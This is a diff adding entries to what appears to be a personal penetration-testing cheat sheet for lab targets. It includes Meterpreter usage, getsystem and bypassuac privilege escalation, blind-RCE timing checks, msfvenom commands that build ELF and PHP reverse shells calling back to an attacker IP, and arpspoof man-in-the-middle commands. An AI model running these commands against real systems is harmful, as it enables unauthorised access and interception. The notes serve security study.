@@ -239,7 +239,13 @@
 - `enum4linux -n 10.10.10.222`
 - `nmap -script=smb-brute 10.10.10.222` - Quickly gives us a login and password for users
 
-  
+### Meterpreter
+- `reverse_tcp` - Will attempt to connect back to our (attacking) machine. (Helps evade FW, if you choose the right port)
+- `bind_tcp` - Creates a server-process on the victim machine waiting for us to connect to it. 
+- When navigating a Win machine, make sure to escape the `\`, so instead of `cd C:\` it should be: `cd C:\\`
+- Popular commands:
+  - `route` (IMPORTANT) - Gateway info and routes
+  - `getsystem` - Automatic priv esc, if possible. Won't work in modern Win machines, use `bypassuac` instead which is a seprate exploit (Set session to background, then set bypassuac, afterwards attempt getsystem again).\
   
 ### Helpful Commands
 - `nmap -sn 10.10.10.22/24 | grep -oP '(?<=Nmap scan report for )[^ ]*'` Clean nmap ping sweep - WARNING: can omit some alive hosts out
@@ -261,7 +267,10 @@
 - Port forward: `echo 1 > /proc/sys/net/ipv4/ip_forward`
 - Arpspoof: `arpspoof -i <interface> -t <target ip> -r <host ip>`, NOTE: `-t` address is the source ip (often the victim) and the `-r` is the destination ip. In a MiTM, we are between them. 
   - `arpspoof -i eth0 -t 10.10.10.222 -r 10.10.10.240` - Will intercept traffic in that .222-240 range, this is where Wireshark would be of great help. 
-
+- To confirm a blind RCE, you can use time test out if you really have RCE. Ex: send `sleep+5` and see if the request takes 5 seconds to comeback in burp.
+- `msfvenom -p linux/x64/shell/reverse_tcp lhost=<Attacker IP> lport=443 -f elf -o 443` - Simple msfvenom reverse shell
+- `msfvenom -p php/reverse_php lhost=<Attacker IP> lport=443 -o revShell.php` - Simple php reverse shell, use with metasploit to get meterpreter later on if possible. 
+  - `use post/multi/manager/shell_to_meterpreter` - To upgrade from a simple shell 
     
 ### Good to Know
 - When testing for SQLi, don't just stop at the web UI once you find an injection, use burp to inject into: 
